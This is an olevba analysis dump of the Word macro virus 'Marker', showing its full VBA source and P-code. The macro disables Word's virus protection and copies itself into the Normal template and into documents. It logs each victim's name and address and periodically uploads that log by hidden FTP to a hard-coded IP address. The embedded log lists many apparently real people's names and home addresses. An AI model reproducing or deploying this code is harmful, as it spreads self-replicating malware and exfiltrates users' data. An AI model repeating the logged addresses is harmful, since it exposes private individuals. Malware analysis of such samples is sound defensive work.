olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.ep
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.ep - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()
Documents.Open FileName:="ïóòåâîé_ëèñò.dot"

End Sub

Private Sub CommandButton11_Click()
Documents.Open FileName:="decide99.doc"

End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 16385, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 26384, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 09:23:32 AM - Wednesday, 23 Dec 1998
' bcbsa
'



' 12:08:05 PM - Monday, 4 Jan 1999
' ISG
'



' 02:41:37 PM - Tuesday, 5 Jan 1999
' Information Systems Group
'



' 12:49:03 PM - Saturday, 9 Jan 1999
' Mona Sowisky
' CSC Healthcare
' One Embarcadero, Suite 2800
' San Francisco, CA 94111



' 12:42:50 PM - Tuesday, 12 Jan 1999
' p2
'



' 05:10:21 PM - Thursday, 21 Jan 1999
' stevenkl
'



' 03:01:37 PM - Monday, 1 Feb 1999
' Mike Rubini
'



' 03:25:33 PM - Tuesday, 2 Feb 1999
' Marilyn Hoyles
'



' 04:13:43 PM - Thursday, 4 Feb 1999
' Sharon Kirsch
' 16-4111 Arbour Green Drive
' Mississauga, Ontario
' L5L 2Z2



' 04:08:01 PM - Monday, 8 Feb 1999
' Nancy Lyras
' Mr. & Mrs. George Lyras
' 5 Jamieson Court
' Sutton, MA  01590



' 11:21:09 AM - Friday, 12 Feb 1999
' Karen Poirier
' Karen L. Poirier
' 35 Windmill Drive
' Marlboro, MA  01752



' 03:55:49 PM - Tuesday, 16 Feb 1999
' Janice Levenson
'



' 02:23:17 PM - Tuesday, 23 Feb 1999
' Janice Levenson
'



' 05:14:00 PM - Tuesday, 23 Feb 1999
' IBU
'



' 08:25:02 AM - Thursday, 25 Feb 1999
' jzakarin
'



' 10:39:53  - Friday, 5 Mar 1999
' Graham Schultz
' Suite 17, Level 1
' Bridgepoint
' 3 Brady Street
' Mosman NSW 2088
' Australia



' 10:31:00 AM - Friday, 12 Mar 1999
' Richard Dagge
'



' 02:13:41  - jeudi, 15 avr 1999
' Anne Deneyer
'



' 12:39:45  - lundi, 19 avr 1999
' Fidelma Joyce
'



' 11:27:06  - âòîðíèê, 20 àïð 1999
' Áîáðîâ
'



' 10:44:49  - âòîðíèê, 27 àïð 1999
' Âåòëóæñêèõ
'



' 04:59:32  - Salý, 29 Haz 1999
' Aylin ZAÐRALI
'



' 10:42:41  - ïÿòíèöà, 9 èþë 1999
' çàïàä-âîñòîê
'



' 06:41:28  - ÷åòâåðã, 23 ñåí 1999
' Olga Brook
'



' 08:05:18 AM - Saturday, 27 Nov 1999
' xx
'



' 02:08:34  - ïîíåäåëüíèê, 27 äåê 1999
' Albert
'



' 06:44:04  - ïîíåäåëüíèê, 10 ÿíâ 2000
' Albert
'



' 11:23:41  - âòîðíèê, 18 ÿíâ 2000
' Ekaterina Saponenko
'



' 05:22:24  - âòîðíèê, 18 ÿíâ 2000
' Šãáâ®¢
'



' 09:01:55  - ÷åòâåðã, 20 ÿíâ 2000
' Âàñèëèé Õðîìîâ
'



' 12:21:07  - ñðåäà, 2 ôåâ 2000
' Âàñèëèé Õðîìîâ
'



' 10:13:06  - ïÿòíèöà, 18 ôåâ 2000
' Irina Kochetkova
'



' 02:14:44  - âòîðíèê, 22 ôåâ 2000
' Èíñòèòóò ÄÏÎ
'



' 03:09:29  - ïÿòíèöà, 25 ôåâ 2000
' 14
'



' 11:41:47  - ñóááîòà, 26 ôåâ 2000
' 16
'



' 01:55:51  - ïîíåäåëüíèê, 6 ìàð 2000
' 1
'



' 11:21:04  - ñóááîòà, 11 ìàð 2000
' 6
'



' 10:44:31  - âòîðíèê, 11 àïð 2000
' 9
'



' 08:41:05  - otrdiena, 11 Apr 2000
' USER
'



' 03:20:20  - ÷åòâåðã, 13 àïð 2000
' 14
'



' 07:46:43  - ïÿòíèöà, 14 àïð 2000
' 11
'



' 11


' 10:32:56 PM - ÷åòâåðã, 18 ìàé 2000
' Ãåîðãèé
'



' 03:26:44  - âòîðíèê, 6 èþí 2000
' George
'



' 02:53:53  - ñðåäà, 14 èþí 2000
' George
'



' 04:36:46  - ÷åòâåðã, 21 ñåí 2000
' internet
'



' 04:58:30  - ïÿòíèöà, 22 ñåí 2000
' Klark
'



' 04:18:54 PM - Wednesday, 8 Nov 2000
' fs080298
' CNNHS B'92 PHILIPPINES (CNSC)



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Marker.ep
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 16987 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	LitStr 0x0010 "ïóòåâîé_ëèñò.dot"
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #2:
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Sub CommandButton11_Click())
' Line #6:
' 	LitStr 0x000C "decide99.doc"
' 	ParamNamed FileName 
' 	Ld Documents 
' 	ArgsMemCall Option 0x0001 
' Line #7:
' Line #8:
' 	EndSub 
' Line #9:
' Line #10:
' 	FuncDefn (Private Sub Document_Close())
' Line #11:
' Line #12:
' 	OnError (Resume Next) 
' Line #13:
' Line #14:
' 	Dim (Const) 
' 	LitStr 0x0014 "<- this is a marker!"
' 	VarDefn Marker
' Line #15:
' Line #16:
' 	QuoteRem 0x0000 0x0011 "Declare Variables"
' Line #17:
' 	Dim 
' 	VarDefn SaveDocument
' 	VarDefn SaveNormalTemplate
' 	VarDefn DocumentInfected
' 	VarDefn NormalTemplateInfected (As Boolean)
' Line #18:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #19:
' 	Dim 
' 	VarDefn OurCode
' 	VarDefn UserAddress
' 	VarDefn LogData
' 	VarDefn LogFile (As String)
' Line #20:
' Line #21:
' 	QuoteRem 0x0000 0x0014 "Initialize Variables"
' Line #22:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #23:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #24:
' Line #25:
' 	Ld Marker 
' 	LitDI2 0x4001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St DocumentInfected 
' Line #26:
' 	Ld Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x6710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	St NormalTemplateInfected 
' Line #27:
' Line #28:
' Line #29:
' 	QuoteRem 0x0000 0x001E "Switch the VirusProtection OFF"
' Line #30:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #31:
' Line #32:
' Line #33:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #34:
' Line #35:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #37:
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #38:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St LogData 
' Line #39:
' 	EndIfBlock 
' Line #40:
' Line #41:
' 	Ld LogData 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Ld LogData 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Ld LogData 
' 	LitStr 0x0005 "' Log"
' 	LitStr 0x0008 "file -->"
' 	Concat 
' 	FnInStr3 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St LogData 
' Line #42:
' Line #43:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0004 
' 	For 
' Line #44:
' 	Ld LogFile 
' 	LitDI2 0x0008 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	ArgsLd Str 0x0001 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St LogFile 
' Line #45:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	LitStr 0x0006 "C:\hsf"
' 	Ld LogFile 
' 	Concat 
' 	LitStr 0x0004 ".sys"
' 	Concat 
' 	St LogFile 
' Line #47:
' Line #48:
' 	Ld LogFile 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld LogData 
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #51:
' Line #52:
' 	LitStr 0x000D "c:\netldx.vxd"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "o 209.201.88.110"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "user anonymous"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "pass itsme@"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "cd incoming"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "ascii"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld LogFile 
' 	Concat 
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #61:
' Line #62:
' 	LitStr 0x002A "command.com /c ftp.exe -n -s:c:\netldx.vxd"
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #63:
' Line #64:
' 	LitVarSpecial (True)
' 	LitStr 0x0000 ""
' 	LitStr 0x003E "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info"
' 	LitStr 0x0007 "LogFile"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #65:
' Line #66:
' 	EndIfBlock 
' Line #67:
' Line #68:
' Line #69:
' 	QuoteRem 0x0000 0x004D "Make sure that some conditions are true before we continue infecting anything"
' Line #70:
' 	LineCont 0x0008 0B 00 03 00 12 00 03 00
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Xor 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #71:
' Line #72:
' Line #73:
' 	QuoteRem 0x0002 0x0019 "Infect the NormalTemplate"
' Line #74:
' 	Ld DocumentInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #75:
' Line #76:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St SaveNormalTemplate 
' Line #77:
' Line #78:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #79:
' Line #80:
' Line #81:
' 	QuoteRem 0x0004 0x0031 "Write a log file of this NormalTemplate infection"
' Line #82:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Application 
' 	MemLd UserAddress 
' 	FnLen 
' 	For 
' Line #83:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #84:
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Ne 
' 	IfBlock 
' Line #85:
' 	Ld UserAddress 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St UserAddress 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	ElseBlock 
' Line #88:
' 	Ld UserAddress 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	St UserAddress 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #91:
' Line #92:
' 	LineCont 0x0010 09 00 0E 00 12 00 15 00 1E 00 0E 00 29 00 0E 00
' 	Ld OurCode 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Time 
' 	LitStr 0x0010 "hh:mm:ss AMPM - "
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	Ld Date 
' 	LitStr 0x0010 "dddd, d mmm yyyy"
' 	ArgsLd Format$ 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0002 "' "
' 	Concat 
' 	Ld UserAddress 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St OurCode 
' Line #93:
' Line #94:
' Line #95:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #96:
' 	Ld OurCode 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #97:
' Line #98:
' 	Ld SaveNormalTemplate 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #99:
' Line #100:
' 	EndIfBlock 
' Line #101:
' Line #102:
' Line #103:
' 	QuoteRem 0x0002 0x0019 "Infect the ActiveDocument"
' Line #104:
' 	LineCont 0x0008 05 00 05 00 13 00 05 00
' 	Ld NormalTemplateInfected 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 ":"
' 	Eq 
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #105:
' Line #106:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St SaveDocument 
' Line #107:
' Line #108:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld nt 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St OurCode 
' Line #109:
' Line #110:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #111:
' 	Ld OurCode 
' 	Ld ad 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #112:
' Line #113:
' 	Ld SaveDocument 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #114:
' Line #115:
' 	EndIfBlock 
' Line #116:
' Line #117:
' Line #118:
' 	EndIfBlock 
' Line #119:
' Line #120:
' 	EndSub 
' Line #121:
' Line #122:
' 	QuoteRem 0x0000 0x000C " Logfile -->"
' Line #123:
' Line #124:
' 	QuoteRem 0x0000 0x0022 " 09:08:36  - Saturday, 28 Nov 1998"
' Line #125:
' 	QuoteRem 0x0000 0x0007 " SPo0Ky"
' Line #126:
' 	QuoteRem 0x0000 0x000C " Blue Planet"
' Line #127:
' 	QuoteRem 0x0000 0x0000 ""
' Line #128:
' Line #129:
' Line #130:
' Line #131:
' 	QuoteRem 0x0000 0x0024 " 02:50:31 PM - Saturday, 28 Nov 1998"
' Line #132:
' 	QuoteRem 0x0000 0x000D " MARK B. SEAY"
' Line #133:
' 	QuoteRem 0x0000 0x0000 ""
' Line #134:
' Line #135:
' Line #136:
' Line #137:
' 	QuoteRem 0x0000 0x0021 " 08:04:45 AM - Friday, 4 Dec 1998"
' Line #138:
' 	QuoteRem 0x0000 0x0004 " UPS"
' Line #139:
' 	QuoteRem 0x0000 0x0000 ""
' Line #140:
' Line #141:
' Line #142:
' Line #143:
' 	QuoteRem 0x0000 0x0024 " 11:43:35 AM - Thursday, 17 Dec 1998"
' Line #144:
' 	QuoteRem 0x0000 0x0004 " WRO"
' Line #145:
' 	QuoteRem 0x0000 0x0000 ""
' Line #146:
' Line #147:
' Line #148:
' Line #149:
' 	QuoteRem 0x0000 0x0025 " 09:23:32 AM - Wednesday, 23 Dec 1998"
' Line #150:
' 	QuoteRem 0x0000 0x0006 " bcbsa"
' Line #151:
' 	QuoteRem 0x0000 0x0000 ""
' Line #152:
' Line #153:
' Line #154:
' Line #155:
' 	QuoteRem 0x0000 0x0021 " 12:08:05 PM - Monday, 4 Jan 1999"
' Line #156:
' 	QuoteRem 0x0000 0x0004 " ISG"
' Line #157:
' 	QuoteRem 0x0000 0x0000 ""
' Line #158:
' Line #159:
' Line #160:
' Line #161:
' 	QuoteRem 0x0000 0x0022 " 02:41:37 PM - Tuesday, 5 Jan 1999"
' Line #162:
' 	QuoteRem 0x0000 0x001A " Information Systems Group"
' Line #163:
' 	QuoteRem 0x0000 0x0000 ""
' Line #164:
' Line #165:
' Line #166:
' Line #167:
' 	QuoteRem 0x0000 0x0023 " 12:49:03 PM - Saturday, 9 Jan 1999"
' Line #168:
' 	QuoteRem 0x0000 0x000D " Mona Sowisky"
' Line #169:
' 	QuoteRem 0x0000 0x000F " CSC Healthcare"
' Line #170:
' 	QuoteRem 0x0000 0x001C " One Embarcadero, Suite 2800"
' Line #171:
' 	QuoteRem 0x0000 0x0018 " San Francisco, CA 94111"
' Line #172:
' Line #173:
' Line #174:
' Line #175:
' 	QuoteRem 0x0000 0x0023 " 12:42:50 PM - Tuesday, 12 Jan 1999"
' Line #176:
' 	QuoteRem 0x0000 0x0003 " p2"
' Line #177:
' 	QuoteRem 0x0000 0x0000 ""
' Line #178:
' Line #179:
' Line #180:
' Line #181:
' 	QuoteRem 0x0000 0x0024 " 05:10:21 PM - Thursday, 21 Jan 1999"
' Line #182:
' 	QuoteRem 0x0000 0x0009 " stevenkl"
' Line #183:
' 	QuoteRem 0x0000 0x0000 ""
' Line #184:
' Line #185:
' Line #186:
' Line #187:
' 	QuoteRem 0x0000 0x0021 " 03:01:37 PM - Monday, 1 Feb 1999"
' Line #188:
' 	QuoteRem 0x0000 0x000C " Mike Rubini"
' Line #189:
' 	QuoteRem 0x0000 0x0000 ""
' Line #190:
' Line #191:
' Line #192:
' Line #193:
' 	QuoteRem 0x0000 0x0022 " 03:25:33 PM - Tuesday, 2 Feb 1999"
' Line #194:
' 	QuoteRem 0x0000 0x000F " Marilyn Hoyles"
' Line #195:
' 	QuoteRem 0x0000 0x0000 ""
' Line #196:
' Line #197:
' Line #198:
' Line #199:
' 	QuoteRem 0x0000 0x0023 " 04:13:43 PM - Thursday, 4 Feb 1999"
' Line #200:
' 	QuoteRem 0x0000 0x000E " Sharon Kirsch"
' Line #201:
' 	QuoteRem 0x0000 0x001B " 16-4111 Arbour Green Drive"
' Line #202:
' 	QuoteRem 0x0000 0x0015 " Mississauga, Ontario"
' Line #203:
' 	QuoteRem 0x0000 0x0008 " L5L 2Z2"
' Line #204:
' Line #205:
' Line #206:
' Line #207:
' 	QuoteRem 0x0000 0x0021 " 04:08:01 PM - Monday, 8 Feb 1999"
' Line #208:
' 	QuoteRem 0x0000 0x000C " Nancy Lyras"
' Line #209:
' 	QuoteRem 0x0000 0x0018 " Mr. & Mrs. George Lyras"
' Line #210:
' 	QuoteRem 0x0000 0x0011 " 5 Jamieson Court"
' Line #211:
' 	QuoteRem 0x0000 0x0012 " Sutton, MA  01590"
' Line #212:
' Line #213:
' Line #214:
' Line #215:
' 	QuoteRem 0x0000 0x0022 " 11:21:09 AM - Friday, 12 Feb 1999"
' Line #216:
' 	QuoteRem 0x0000 0x000E " Karen Poirier"
' Line #217:
' 	QuoteRem 0x0000 0x0011 " Karen L. Poirier"
' Line #218:
' 	QuoteRem 0x0000 0x0012 " 35 Windmill Drive"
' Line #219:
' 	QuoteRem 0x0000 0x0014 " Marlboro, MA  01752"
' Line #220:
' Line #221:
' Line #222:
' Line #223:
' 	QuoteRem 0x0000 0x0023 " 03:55:49 PM - Tuesday, 16 Feb 1999"
' Line #224:
' 	QuoteRem 0x0000 0x0010 " Janice Levenson"
' Line #225:
' 	QuoteRem 0x0000 0x0000 ""
' Line #226:
' Line #227:
' Line #228:
' Line #229:
' 	QuoteRem 0x0000 0x0023 " 02:23:17 PM - Tuesday, 23 Feb 1999"
' Line #230:
' 	QuoteRem 0x0000 0x0010 " Janice Levenson"
' Line #231:
' 	QuoteRem 0x0000 0x0000 ""
' Line #232:
' Line #233:
' Line #234:
' Line #235:
' 	QuoteRem 0x0000 0x0023 " 05:14:00 PM - Tuesday, 23 Feb 1999"
' Line #236:
' 	QuoteRem 0x0000 0x0004 " IBU"
' Line #237:
' 	QuoteRem 0x0000 0x0000 ""
' Line #238:
' Line #239:
' Line #240:
' Line #241:
' 	QuoteRem 0x0000 0x0024 " 08:25:02 AM - Thursday, 25 Feb 1999"
' Line #242:
' 	QuoteRem 0x0000 0x0009 " jzakarin"
' Line #243:
' 	QuoteRem 0x0000 0x0000 ""
' Line #244:
' Line #245:
' Line #246:
' Line #247:
' 	QuoteRem 0x0000 0x001F " 10:39:53  - Friday, 5 Mar 1999"
' Line #248:
' 	QuoteRem 0x0000 0x000F " Graham Schultz"
' Line #249:
' 	QuoteRem 0x0000 0x0012 " Suite 17, Level 1"
' Line #250:
' 	QuoteRem 0x0000 0x000C " Bridgepoint"
' Line #251:
' 	QuoteRem 0x0000 0x000F " 3 Brady Street"
' Line #252:
' 	QuoteRem 0x0000 0x0010 " Mosman NSW 2088"
' Line #253:
' 	QuoteRem 0x0000 0x000A " Australia"
' Line #254:
' Line #255:
' Line #256:
' Line #257:
' 	QuoteRem 0x0000 0x0022 " 10:31:00 AM - Friday, 12 Mar 1999"
' Line #258:
' 	QuoteRem 0x0000 0x000E " Richard Dagge"
' Line #259:
' 	QuoteRem 0x0000 0x0000 ""
' Line #260:
' Line #261:
' Line #262:
' Line #263:
' 	QuoteRem 0x0000 0x001F " 02:13:41  - jeudi, 15 avr 1999"
' Line #264:
' 	QuoteRem 0x0000 0x000D " Anne Deneyer"
' Line #265:
' 	QuoteRem 0x0000 0x0000 ""
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' 	QuoteRem 0x0000 0x001F " 12:39:45  - lundi, 19 avr 1999"
' Line #270:
' 	QuoteRem 0x0000 0x000E " Fidelma Joyce"
' Line #271:
' 	QuoteRem 0x0000 0x0000 ""
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' 	QuoteRem 0x0000 0x0021 " 11:27:06  - âòîðíèê, 20 àïð 1999"
' Line #276:
' 	QuoteRem 0x0000 0x0007 " Áîáðîâ"
' Line #277:
' 	QuoteRem 0x0000 0x0000 ""
' Line #278:
